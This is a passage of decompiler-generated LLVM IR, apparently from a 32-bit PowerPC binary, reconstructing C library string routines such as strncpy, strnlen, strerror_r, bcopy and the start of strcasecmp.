  %v1_1000b534 = add i32 %v2_1000b530, 1
  ret i32 %v1_1000b534

dec_label_pc_1000b53c:                            ; preds = %dec_label_pc_1000b524
  %v1_1000b53c = add i32 %v1_1000b530, 2
  %v2_1000b53c = inttoptr i32 %v1_1000b53c to i8*
  %v3_1000b53c = load i8, i8* %v2_1000b53c, align 1
  %v3_1000b540 = icmp eq i8 %v3_1000b53c, 0
  br i1 %v3_1000b540, label %dec_label_pc_1000b548, label %dec_label_pc_1000b554

dec_label_pc_1000b548:                            ; preds = %dec_label_pc_1000b53c
  %v2_1000b548 = sub i32 %v1_1000b530, %v0_1000b4c8
  %v1_1000b54c = add i32 %v2_1000b548, 2
  ret i32 %v1_1000b54c

dec_label_pc_1000b554:                            ; preds = %dec_label_pc_1000b53c
  %v1_1000b554 = add i32 %v1_1000b530, 3
  %v2_1000b554 = inttoptr i32 %v1_1000b554 to i8*
  %v3_1000b554 = load i8, i8* %v2_1000b554, align 1
  %v3_1000b558 = icmp eq i8 %v3_1000b554, 0
  br i1 %v3_1000b558, label %dec_label_pc_1000b560, label %dec_label_pc_1000b4f4

dec_label_pc_1000b560:                            ; preds = %dec_label_pc_1000b554
  %v2_1000b560 = sub i32 %v1_1000b530, %v0_1000b4c8
  %v1_1000b564 = add i32 %v2_1000b560, 3
  ret i32 %v1_1000b564

; uselistorder directives
  uselistorder i32 %v1_1000b4f8, { 1, 0 }
  uselistorder i32 %v1_1000b530, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000b4dc, { 1, 0, 2 }
  uselistorder i32 %v0_1000b4c8, { 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder label %dec_label_pc_1000b51c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b4d0, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000b56c = icmp eq i32 %arg2, 3
  store i1 %v3_1000b56c, i1* %cr7_eq.global-to-local, align 1
  %v1_1000b570 = add i32 %arg1, -1
  store i32 %v1_1000b570, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000b5ec, label %dec_label_pc_1000b578

dec_label_pc_1000b578:                            ; preds = %entry
  %v1_1000b578 = udiv i32 %arg2, 4
  store i32 %v1_1000b578, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000b580

dec_label_pc_1000b580:                            ; preds = %dec_label_pc_1000b5d0, %dec_label_pc_1000b578
  %v2_1000b590 = phi i32 [ %v3_1000b5c8, %dec_label_pc_1000b5d0 ], [ %v1_1000b570, %dec_label_pc_1000b578 ]
  %v0_1000b580 = load i32, i32* @r4, align 4
  %v1_1000b580 = inttoptr i32 %v0_1000b580 to i8*
  %v2_1000b580 = load i8, i8* %v1_1000b580, align 1
  %v1_1000b584 = add i32 %v0_1000b580, 1
  store i32 %v1_1000b584, i32* @r10, align 4
  %v1_1000b588 = add i32 %v0_1000b580, 2
  store i32 %v1_1000b588, i32* @r8, align 4
  %v3_1000b58c = icmp eq i8 %v2_1000b580, 0
  store i1 %v3_1000b58c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000b590 = add i32 %v2_1000b590, 1
  %v4_1000b590 = inttoptr i32 %v3_1000b590 to i8*
  store i8 %v2_1000b580, i8* %v4_1000b590, align 1
  store i32 %v3_1000b590, i32* %r11.global-to-local, align 4
  %v0_1000b594 = load i32, i32* @r8, align 4
  %v1_1000b594 = add i32 %v0_1000b594, 1
  store i32 %v1_1000b594, i32* %r9.global-to-local, align 4
  %v0_1000b598 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b598, label %dec_label_pc_1000b5d8, label %dec_label_pc_1000b59c

dec_label_pc_1000b59c:                            ; preds = %dec_label_pc_1000b580
  %v0_1000b59c = load i32, i32* @r4, align 4
  %v1_1000b59c = add i32 %v0_1000b59c, 1
  %v2_1000b59c = inttoptr i32 %v1_1000b59c to i8*
  %v3_1000b59c = load i8, i8* %v2_1000b59c, align 1
  %v1_1000b5a0 = add i32 %v0_1000b594, 2
  store i32 %v1_1000b5a0, i32* @r4, align 4
  %v3_1000b5a4 = icmp eq i8 %v3_1000b59c, 0
  store i1 %v3_1000b5a4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000b5a8 = add i32 %v2_1000b590, 2
  %v4_1000b5a8 = inttoptr i32 %v3_1000b5a8 to i8*
  store i8 %v3_1000b59c, i8* %v4_1000b5a8, align 1
  store i32 %v3_1000b5a8, i32* %r11.global-to-local, align 4
  %v0_1000b5ac = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b5ac, label %dec_label_pc_1000b5d8, label %dec_label_pc_1000b5b0

dec_label_pc_1000b5b0:                            ; preds = %dec_label_pc_1000b59c
  %v0_1000b5b0 = load i32, i32* @r10, align 4
  %v1_1000b5b0 = add i32 %v0_1000b5b0, 1
  %v2_1000b5b0 = inttoptr i32 %v1_1000b5b0 to i8*
  %v3_1000b5b0 = load i8, i8* %v2_1000b5b0, align 1
  %v3_1000b5b4 = icmp eq i8 %v3_1000b5b0, 0
  store i1 %v3_1000b5b4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000b5b8 = add i32 %v2_1000b590, 3
  %v4_1000b5b8 = inttoptr i32 %v3_1000b5b8 to i8*
  store i8 %v3_1000b5b0, i8* %v4_1000b5b8, align 1
  store i32 %v3_1000b5b8, i32* %r11.global-to-local, align 4
  %v0_1000b5bc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b5bc, label %dec_label_pc_1000b5d8, label %dec_label_pc_1000b5c0

dec_label_pc_1000b5c0:                            ; preds = %dec_label_pc_1000b5b0
  %v0_1000b5c0 = load i32, i32* @r8, align 4
  %v1_1000b5c0 = add i32 %v0_1000b5c0, 1
  %v2_1000b5c0 = inttoptr i32 %v1_1000b5c0 to i8*
  %v3_1000b5c0 = load i8, i8* %v2_1000b5c0, align 1
  %v3_1000b5c4 = icmp eq i8 %v3_1000b5c0, 0
  store i1 %v3_1000b5c4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000b5c8 = add i32 %v2_1000b590, 4
  %v4_1000b5c8 = inttoptr i32 %v3_1000b5c8 to i8*
  store i8 %v3_1000b5c0, i8* %v4_1000b5c8, align 1
  store i32 %v3_1000b5c8, i32* %r11.global-to-local, align 4
  %v0_1000b5cc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b5cc, label %dec_label_pc_1000b5d8, label %dec_label_pc_1000b5d0

dec_label_pc_1000b5d0:                            ; preds = %dec_label_pc_1000b5c0
  %v0_1000b5d0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b5d0 = add i32 %v0_1000b5d0, -1
  store i32 %v1_1000b5d0, i32* %ctr.global-to-local, align 4
  %v2_1000b5d0 = icmp eq i32 %v1_1000b5d0, 0
  br i1 %v2_1000b5d0, label %dec_label_pc_1000b5ec, label %dec_label_pc_1000b580

dec_label_pc_1000b5d8:                            ; preds = %dec_label_pc_1000b5c0, %dec_label_pc_1000b5b0, %dec_label_pc_1000b59c, %dec_label_pc_1000b580
  %v1_1000b5d8 = phi i32 [ %v3_1000b5c8, %dec_label_pc_1000b5c0 ], [ %v3_1000b5b8, %dec_label_pc_1000b5b0 ], [ %v3_1000b5a8, %dec_label_pc_1000b59c ], [ %v3_1000b590, %dec_label_pc_1000b580 ]
  %v2_1000b5d811 = sub i32 %arg1, %v1_1000b5d8
  %v2_1000b5dc = add i32 %v2_1000b5d811, %arg2
  %v1_1000b5e0 = add i32 %v2_1000b5dc, -1
  store i32 %v1_1000b5e0, i32* %r9.global-to-local, align 4
  %v4_1000b5e0 = icmp eq i32 %v1_1000b5e0, 0
  %v0_1000b5e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000b5e0, i32 %v0_1000b5e4)
  %v2_1000b61c.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000b614

dec_label_pc_1000b5ec:                            ; preds = %dec_label_pc_1000b5d0, %entry
  %v1_1000b5ec = urem i32 %arg2, 4
  store i32 %v1_1000b5ec, i32* %r9.global-to-local, align 4
  %v3_1000b5ec = icmp eq i32 %v1_1000b5ec, 0
  %v0_1000b5f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000b5ec, i32 %v0_1000b5f0)
  store i32 %v1_1000b5ec, i32* %ctr.global-to-local, align 4
  %v2_1000b608.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000b5f8

dec_label_pc_1000b5f8:                            ; preds = %dec_label_pc_1000b610.dec_label_pc_1000b5f8_crit_edge, %dec_label_pc_1000b5ec
  %v2_1000b608 = phi i32 [ %v3_1000b608, %dec_label_pc_1000b610.dec_label_pc_1000b5f8_crit_edge ], [ %v2_1000b608.pre, %dec_label_pc_1000b5ec ]
  %v0_1000b5fc = phi i32 [ %v0_1000b5fc.pre, %dec_label_pc_1000b610.dec_label_pc_1000b5f8_crit_edge ], [ %v1_1000b5ec, %dec_label_pc_1000b5ec ]
  %v0_1000b5f8 = load i32, i32* @r4, align 4
  %v1_1000b5f8 = inttoptr i32 %v0_1000b5f8 to i8*
  %v2_1000b5f8 = load i8, i8* %v1_1000b5f8, align 1
  %v1_1000b5fc = add i32 %v0_1000b5fc, -1
  store i32 %v1_1000b5fc, i32* %r9.global-to-local, align 4
  %v1_1000b600 = add i32 %v0_1000b5f8, 1
  store i32 %v1_1000b600, i32* @r4, align 4
  %v3_1000b604 = icmp eq i8 %v2_1000b5f8, 0
  store i1 %v3_1000b604, i1* %cr7_eq.global-to-local, align 1
  %v3_1000b608 = add i32 %v2_1000b608, 1
  %v4_1000b608 = inttoptr i32 %v3_1000b608 to i8*
  store i8 %v2_1000b5f8, i8* %v4_1000b608, align 1
  store i32 %v3_1000b608, i32* %r11.global-to-local, align 4
  %v0_1000b60c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b60c = add i32 %v0_1000b60c, -1
  store i32 %v1_1000b60c, i32* %ctr.global-to-local, align 4
  %v2_1000b60c = icmp eq i32 %v1_1000b60c, 0
  br i1 %v2_1000b60c, label %dec_label_pc_1000b624, label %dec_label_pc_1000b610

dec_label_pc_1000b610:                            ; preds = %dec_label_pc_1000b5f8
  %v0_1000b610 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b610, label %dec_label_pc_1000b614, label %dec_label_pc_1000b610.dec_label_pc_1000b5f8_crit_edge

dec_label_pc_1000b610.dec_label_pc_1000b5f8_crit_edge: ; preds = %dec_label_pc_1000b610
  %v0_1000b5fc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000b5f8

dec_label_pc_1000b614:                            ; preds = %dec_label_pc_1000b610, %dec_label_pc_1000b5d8
  %v2_1000b61c.pre = phi i32 [ %v2_1000b61c.pre.pre, %dec_label_pc_1000b5d8 ], [ %v3_1000b608, %dec_label_pc_1000b610 ]
  %v0_1000b614 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000b614, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000b618

dec_label_pc_1000b618:                            ; preds = %dec_label_pc_1000b618, %dec_label_pc_1000b614
  %v2_1000b61c = phi i32 [ %v3_1000b61c, %dec_label_pc_1000b618 ], [ %v2_1000b61c.pre, %dec_label_pc_1000b614 ]
  %v3_1000b61c = add i32 %v2_1000b61c, 1
  %v4_1000b61c = inttoptr i32 %v3_1000b61c to i8*
  store i8 0, i8* %v4_1000b61c, align 1
  store i32 %v3_1000b61c, i32* %r11.global-to-local, align 4
  %v0_1000b620 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b620 = add i32 %v0_1000b620, -1
  store i32 %v1_1000b620, i32* %ctr.global-to-local, align 4
  %v2_1000b620 = icmp eq i32 %v1_1000b620, 0
  br i1 %v2_1000b620, label %dec_label_pc_1000b624, label %dec_label_pc_1000b618

dec_label_pc_1000b624:                            ; preds = %dec_label_pc_1000b5f8, %dec_label_pc_1000b618
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000b620, { 1, 0 }
  uselistorder i32 %v3_1000b61c, { 1, 2, 0 }
  uselistorder i32 %v1_1000b60c, { 1, 0 }
  uselistorder i32 %v3_1000b608, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000b5ec, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000b5d0, { 1, 0 }
  uselistorder i32 %v3_1000b5c8, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b624, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000b628 = load i32, i32* @r4, align 4
  %v3_1000b628 = icmp eq i32 %v0_1000b628, 0
  store i32 %tmp, i32* @r10, align 4
  %v0_1000b634 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000b628, i32 %v0_1000b634)
  %v0_1000b644 = load i32, i32* @r10, align 4
  %v1_1000b644 = load i32, i32* @r4, align 4
  %v2_1000b644 = add i32 %v1_1000b644, %v0_1000b644
  %v3_1000b648 = icmp ugt i32 %v2_1000b644, %v0_1000b644
  %v4_1000b648 = icmp eq i32 %v1_1000b644, 0
  %v2_1000b64c = or i1 %v4_1000b648, %v3_1000b648
  br i1 %v2_1000b64c, label %dec_label_pc_1000b654, label %dec_label_pc_1000b650

dec_label_pc_1000b63c:                            ; preds = %dec_label_pc_1000b6bc
  br label %dec_label_pc_1000b700

dec_label_pc_1000b650:                            ; preds = %entry
  br label %dec_label_pc_1000b654

dec_label_pc_1000b654:                            ; preds = %entry, %dec_label_pc_1000b650
  %v0_1000b704 = phi i32 [ %v2_1000b644, %entry ], [ -1, %dec_label_pc_1000b650 ]
  %v1_1000b6846 = urem i32 %v0_1000b644, 4
  %v3_1000b6848 = icmp eq i32 %v1_1000b6846, 0
  br i1 %v3_1000b6848, label %dec_label_pc_1000b68c, label %dec_label_pc_1000b65c

dec_label_pc_1000b65c:                            ; preds = %dec_label_pc_1000b654, %dec_label_pc_1000b680
  %v0_1000b674 = phi i32 [ %v1_1000b680, %dec_label_pc_1000b680 ], [ %v0_1000b644, %dec_label_pc_1000b654 ]
  %v1_1000b65c = inttoptr i32 %v0_1000b674 to i8*
  %v2_1000b65c = load i8, i8* %v1_1000b65c, align 1
  %v3_1000b660 = icmp eq i8 %v2_1000b65c, 0
  br i1 %v3_1000b660, label %dec_label_pc_1000b668, label %dec_label_pc_1000b680

dec_label_pc_1000b668:                            ; preds = %dec_label_pc_1000b65c
  %v3_1000b668 = icmp ugt i32 %v0_1000b704, %v0_1000b674
  %v0_1000b674.v0_1000b704 = select i1 %v3_1000b668, i32 %v0_1000b674, i32 %v0_1000b704
  %v2_1000b678 = sub i32 %v0_1000b674.v0_1000b704, %v0_1000b644
  ret i32 %v2_1000b678

dec_label_pc_1000b680:                            ; preds = %dec_label_pc_1000b65c
  %v1_1000b680 = add i32 %v0_1000b674, 1
  %v1_1000b684 = urem i32 %v1_1000b680, 4
  %v3_1000b684 = icmp eq i32 %v1_1000b684, 0
  br i1 %v3_1000b684, label %dec_label_pc_1000b68c, label %dec_label_pc_1000b65c

dec_label_pc_1000b68c:                            ; preds = %dec_label_pc_1000b680, %dec_label_pc_1000b654
  %v0_1000b690 = phi i32 [ %v0_1000b644, %dec_label_pc_1000b654 ], [ %v1_1000b680, %dec_label_pc_1000b680 ]
  store i32 -2139062144, i32* @r7, align 4
  %v2_1000b6f83 = icmp ult i32 %v0_1000b690, %v0_1000b704
  br i1 %v2_1000b6f83, label %dec_label_pc_1000b69c, label %dec_label_pc_1000b700

dec_label_pc_1000b69c:                            ; preds = %dec_label_pc_1000b68c, %dec_label_pc_1000b6f4
  %v0_1000b63c = phi i32 [ %v1_1000b6a0, %dec_label_pc_1000b6f4 ], [ %v0_1000b690, %dec_label_pc_1000b68c ]
  %v1_1000b69c = inttoptr i32 %v0_1000b63c to i32*
  %v2_1000b69c = load i32, i32* %v1_1000b69c, align 4
  %v1_1000b6a0 = add i32 %v0_1000b63c, 4
  store i32 %v0_1000b63c, i32* @r8, align 4
  %v1_1000b6ac = add i32 %v2_1000b69c, -16843009
  %v2_1000b6b0 = and i32 %v1_1000b6ac, -2139062144
  %v5_1000b6b0 = icmp eq i32 %v2_1000b6b0, 0
  %v1_1000b6b4 = add i32 %v0_1000b63c, 1
  br i1 %v5_1000b6b0, label %dec_label_pc_1000b6f4, label %dec_label_pc_1000b6bc

dec_label_pc_1000b6bc:                            ; preds = %dec_label_pc_1000b69c
  %v2_1000b6bc = inttoptr i32 %v0_1000b63c to i8*
  %v3_1000b6bc = load i8, i8* %v2_1000b6bc, align 1
  %v3_1000b6c0 = icmp eq i8 %v3_1000b6bc, 0
  br i1 %v3_1000b6c0, label %dec_label_pc_1000b63c, label %dec_label_pc_1000b6c8

dec_label_pc_1000b6c8:                            ; preds = %dec_label_pc_1000b6bc
  %v2_1000b6c8 = inttoptr i32 %v1_1000b6b4 to i8*
  %v3_1000b6c8 = load i8, i8* %v2_1000b6c8, align 1
  %v3_1000b6cc = icmp eq i8 %v3_1000b6c8, 0
  br i1 %v3_1000b6cc, label %dec_label_pc_1000b700, label %dec_label_pc_1000b6d4

dec_label_pc_1000b6d4:                            ; preds = %dec_label_pc_1000b6c8
  %v1_1000b6d4 = add i32 %v0_1000b63c, 2
  %v2_1000b6d4 = inttoptr i32 %v1_1000b6d4 to i8*
  %v3_1000b6d4 = load i8, i8* %v2_1000b6d4, align 1
  %v3_1000b6dc = icmp eq i8 %v3_1000b6d4, 0
  br i1 %v3_1000b6dc, label %dec_label_pc_1000b700, label %dec_label_pc_1000b6e4

dec_label_pc_1000b6e4:                            ; preds = %dec_label_pc_1000b6d4
  %v1_1000b6e4 = add i32 %v0_1000b63c, 3
  %v2_1000b6e4 = inttoptr i32 %v1_1000b6e4 to i8*
  %v3_1000b6e4 = load i8, i8* %v2_1000b6e4, align 1
  %v3_1000b6ec = icmp eq i8 %v3_1000b6e4, 0
  br i1 %v3_1000b6ec, label %dec_label_pc_1000b700, label %dec_label_pc_1000b6f4

dec_label_pc_1000b6f4:                            ; preds = %dec_label_pc_1000b6e4, %dec_label_pc_1000b69c
  %v2_1000b6f8 = icmp ult i32 %v1_1000b6a0, %v0_1000b704
  br i1 %v2_1000b6f8, label %dec_label_pc_1000b69c, label %dec_label_pc_1000b700

dec_label_pc_1000b700:                            ; preds = %dec_label_pc_1000b6f4, %dec_label_pc_1000b6c8, %dec_label_pc_1000b6d4, %dec_label_pc_1000b6e4, %dec_label_pc_1000b68c, %dec_label_pc_1000b63c
  %v0_1000b70c = phi i32 [ %v0_1000b63c, %dec_label_pc_1000b63c ], [ %v0_1000b690, %dec_label_pc_1000b68c ], [ %v1_1000b6e4, %dec_label_pc_1000b6e4 ], [ %v1_1000b6d4, %dec_label_pc_1000b6d4 ], [ %v1_1000b6b4, %dec_label_pc_1000b6c8 ], [ %v0_1000b704, %dec_label_pc_1000b6f4 ]
  %v3_1000b700 = icmp ugt i32 %v0_1000b704, %v0_1000b70c
  %v0_1000b70c.v0_1000b704 = select i1 %v3_1000b700, i32 %v0_1000b70c, i32 %v0_1000b704
  %v2_1000b710 = sub i32 %v0_1000b70c.v0_1000b704, %v0_1000b644
  ret i32 %v2_1000b710

; uselistorder directives
  uselistorder i32 %v1_1000b6a0, { 1, 0 }
  uselistorder i32 %v0_1000b63c, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1000b690, { 1, 0, 2 }
  uselistorder i32 %v1_1000b680, { 1, 0, 2 }
  uselistorder i32 %v0_1000b674, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000b704, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000b644, { 1, 0 }
  uselistorder i32 %v0_1000b644, { 4, 3, 5, 1, 0, 6, 2 }
  uselistorder i32 -2139062144, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000b700, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000b69c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b65c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b654, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268482352, i32* @lr, align 4
  %v0_1000b72c = call i32 @__xpg_strerror_r()
  %v0_1000b734 = load i32, i32* @r29, align 4
  ret i32 %v0_1000b734
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000b748 = load i32, i32* @r3, align 4
  %v2_1000b748 = icmp ugt i32 %v0_1000b748, 124
  %v0_1000b758 = load i32, i32* @r4, align 4
  store i32 %v0_1000b758, i32* %r27.global-to-local, align 4
  %v0_1000b760 = load i32, i32* @r5, align 4
  br i1 %v2_1000b748, label %dec_label_pc_1000b7a4, label %dec_label_pc_1000b768

dec_label_pc_1000b768:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_100160b8.311 to i32), i32* @r30, align 4
  %v3_1000b7847 = icmp eq i32 %v0_1000b748, 0
  br i1 %v3_1000b7847, label %dec_label_pc_1000b798, label %dec_label_pc_1000b778

dec_label_pc_1000b778:                            ; preds = %dec_label_pc_1000b768, %dec_label_pc_1000b778
  br label %dec_label_pc_1000b778

dec_label_pc_1000b798:                            ; preds = %dec_label_pc_1000b768
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000b7d8

dec_label_pc_1000b7a4:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000b748, 0
  %v1_1000b7a8 = zext i1 %tmp to i32
  %v2_1000b7a8 = ashr i32 %v0_1000b748, 31
  %v3_1000b7a8 = and i32 %v2_1000b7a8, -2
  %v4_1000b7a8 = or i32 %v3_1000b7a8, %v1_1000b7a8
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000b7bc = bitcast i32* %stack_var_-39 to i8*
  %v6_1000b7bc = call i32 @_uintmaxtostr(i8* %v5_1000b7bc, i32 %v4_1000b7a8, i32 %v0_1000b748, i32 -10, i32 0)
  %v1_1000b7c4 = add i32 %v6_1000b7bc, -14
  store i32 %v1_1000b7c4, i32* @r30, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_100160a8.312 to i32), i32* @r4, align 4
  store i32 %v1_1000b7c4, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268482520, i32* @lr, align 4
  %v0_1000b7d4 = call i32 @memcpy()
  %v0_1000b7d8.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000b7dc.pre = load i32, i32* @r30, align 4
  %v0_1000b7ec.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000b7d8

dec_label_pc_1000b7d8:                            ; preds = %dec_label_pc_1000b798, %dec_label_pc_1000b7a4
  %v0_1000b7ec = phi i32 [ %v0_1000b760, %dec_label_pc_1000b798 ], [ %v0_1000b7ec.pre, %dec_label_pc_1000b7a4 ]
  %v0_1000b7dc = phi i32 [ ptrtoint ([8 x i8]* @global_var_100160b8.311 to i32), %dec_label_pc_1000b798 ], [ %v0_1000b7dc.pre, %dec_label_pc_1000b7a4 ]
  %v1_1000b7e0 = phi i32 [ %v0_1000b758, %dec_label_pc_1000b798 ], [ %v0_1000b7d8.pre, %dec_label_pc_1000b7a4 ]
  %tmp19 = icmp slt i32 %v1_1000b7e0, 0
  %v1_1000b7d8 = zext i1 %tmp19 to i32
  %v2_1000b7d8 = ashr i32 %v1_1000b7e0, 31
  %v3_1000b7d8 = and i32 %v2_1000b7d8, -2
  %v4_1000b7d8 = or i32 %v3_1000b7d8, %v1_1000b7d8
  store i32 %v0_1000b7dc, i32* @r3, align 4
  %v2_1000b7e0 = xor i32 %v4_1000b7d8, %v1_1000b7e0
  %v2_1000b7e4 = sub i32 %v4_1000b7d8, %v2_1000b7e0
  %tmp20 = icmp slt i32 %v2_1000b7e4, 0
  %v1_1000b7e8 = zext i1 %tmp20 to i32
  %v2_1000b7e8 = ashr i32 %v2_1000b7e4, 31
  %v3_1000b7e8 = and i32 %v2_1000b7e8, -2
  %v4_1000b7e8 = or i32 %v3_1000b7e8, %v1_1000b7e8
  %v2_1000b7ec = and i32 %v4_1000b7e8, %v0_1000b7ec
  store i32 %v2_1000b7ec, i32* @r29, align 4
  %v0_1000b7f0 = call i32 @__GI_strlen()
  %v1_1000b7f4 = add i32 %v0_1000b7f0, 1
  store i32 %v1_1000b7f4, i32* @r31, align 4
  %v1_1000b7f8 = load i32, i32* @r29, align 4
  %v3_1000b7f8 = icmp ugt i32 %v1_1000b7f4, %v1_1000b7f8
  br i1 %v3_1000b7f8, label %dec_label_pc_1000b800, label %dec_label_pc_1000b808

dec_label_pc_1000b800:                            ; preds = %dec_label_pc_1000b7d8
  store i32 %v1_1000b7f8, i32* @r31, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000b808

dec_label_pc_1000b808:                            ; preds = %dec_label_pc_1000b7d8, %dec_label_pc_1000b800
  %v0_1000b818 = phi i32 [ %v1_1000b7f8, %dec_label_pc_1000b800 ], [ %v1_1000b7f4, %dec_label_pc_1000b7d8 ]
  %v3_1000b808 = icmp eq i32 %v0_1000b818, 0
  br i1 %v3_1000b808, label %dec_label_pc_1000b82c, label %dec_label_pc_1000b810

dec_label_pc_1000b810:                            ; preds = %dec_label_pc_1000b808
  %v0_1000b810 = load i32, i32* @r30, align 4
  store i32 %v0_1000b810, i32* @r4, align 4
  %v0_1000b814 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000b814, i32* @r3, align 4
  store i32 %v0_1000b818, i32* @r5, align 4
  store i32 268482592, i32* @lr, align 4
  %v0_1000b81c = call i32 @memcpy()
  %v1_1000b820 = load i32, i32* @r31, align 4
  %v2_1000b820 = add i32 %v1_1000b820, %v0_1000b814
  %v3_1000b828 = add i32 %v2_1000b820, -1
  %v4_1000b828 = inttoptr i32 %v3_1000b828 to i8*
  store i8 0, i8* %v4_1000b828, align 1
  br label %dec_label_pc_1000b82c

dec_label_pc_1000b82c:                            ; preds = %dec_label_pc_1000b808, %dec_label_pc_1000b810
  %v0_1000b82c = load i32, i32* %r28.global-to-local, align 4
  %v3_1000b82c = icmp eq i32 %v0_1000b82c, 0
  br i1 %v3_1000b82c, label %dec_label_pc_1000b83c, label %dec_label_pc_1000b834

dec_label_pc_1000b834:                            ; preds = %dec_label_pc_1000b82c
  %v0_1000b834 = call i32 @__errno_location()
  %v0_1000b838 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000b838 = inttoptr i32 %v0_1000b834 to i32*
  store i32 %v0_1000b838, i32* %v2_1000b838, align 4
  %v0_1000b840.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000b83c

dec_label_pc_1000b83c:                            ; preds = %dec_label_pc_1000b82c, %dec_label_pc_1000b834
  %v0_1000b840 = phi i32 [ 0, %dec_label_pc_1000b82c ], [ %v0_1000b840.pre, %dec_label_pc_1000b834 ]
  ret i32 %v0_1000b840

; uselistorder directives
  uselistorder i32 %v2_1000b7e4, { 1, 0 }
  uselistorder i32 %v4_1000b7d8, { 1, 0 }
  uselistorder i32 %v1_1000b7e0, { 1, 2, 0 }
  uselistorder i32 %v0_1000b748, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 4, 3, 0, 1, 5 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 1, 0 }
  uselistorder label %dec_label_pc_1000b83c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b82c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b808, { 1, 0 }
  uselistorder label %dec_label_pc_1000b7d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b778, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000b860 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1000b860
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000b868 = load i32, i32* bitcast (i32** @global_var_1002c2d8.313 to i32*), align 4
  store i32 %v3_1000b868, i32* @r10, align 4
  %v0_1000b870.pre = load i32, i32* @r3, align 4
  %v1_1000b870.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000b870

dec_label_pc_1000b870:                            ; preds = %dec_label_pc_1000b898, %entry
  %v0_1000b8ac6 = phi i32 [ %v0_1000b8ac7, %dec_label_pc_1000b898 ], [ 0, %entry ]
  %v0_1000b89c = phi i32 [ %v1_1000b89c, %dec_label_pc_1000b898 ], [ %v1_1000b870.pre, %entry ]
  %v0_1000b8a0 = phi i32 [ %v1_1000b8a0, %dec_label_pc_1000b898 ], [ %v0_1000b870.pre, %entry ]
